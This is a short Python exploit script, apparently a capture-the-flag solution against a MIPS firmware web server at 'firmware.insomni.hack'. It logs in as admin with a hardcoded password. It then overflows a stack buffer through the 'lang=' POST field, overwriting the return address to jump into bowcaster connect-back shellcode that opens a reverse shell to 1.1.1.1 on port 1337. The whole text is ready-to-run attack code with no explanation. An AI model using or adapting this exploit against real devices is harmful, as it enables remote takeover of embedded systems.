import requests
import pwn
import os
from bowcaster.common import BigEndian
from bowcaster.payloads.mips import ConnectbackPayload

pwn.context.update(arch='mips', os='linux', endian='big')

#REMOTE = ('firmware.insomni.hack', 80)
REMOTE = ('1.1.1.2', 80)
SHELLCODE = ConnectbackPayload('1.1.1.1', BigEndian, 1337).shellcode 

def connect(url, sid=None, data=None, gdb=False):
    s = pwn.remote(REMOTE[0], REMOTE[1])
    s.sendline(('GET /?' if not data else 'POST /?') + url + ' HTTP/1.1\r')
    s.sendline('Host: firmware.insomni.hack\r')
    s.sendline('Connection: keep-alive\r')
    if sid:
        s.sendline('Cookie: sid=' + sid + '\r')
    if data:
        s.sendline('Content-length: ' + str(len(data)) + '\r')
    s.sendline('\r')
    if data:
        import time
        time.sleep(1)
        s.send(data)
    return s

s = connect('')
s.recvuntil('Set-Cookie:')
cookies = s.recvuntil('\n')
sid = cookies.split('=')[1].strip()
pwn.log.info("SID: {}".format(sid))

s = connect('action=1&user=admin&pass=hardcodedpass!', sid=sid)
s.recvall()

s = connect('', sid=sid)
data = s.recvall()
if not 'Surprisingly' in data:
    print data
    raise Exception()

# 7ffd6000-7fff7000 rwxp 00000000 00:00 0          [stack]

buf = "lang="
buf += 'b'*112
buf += pwn.p32(0x7fff6b88)
buf += SHELLCODE


s = connect('action=2', sid=sid, data=buf)
s.recvall()

s = connect('', sid=sid, gdb=True)
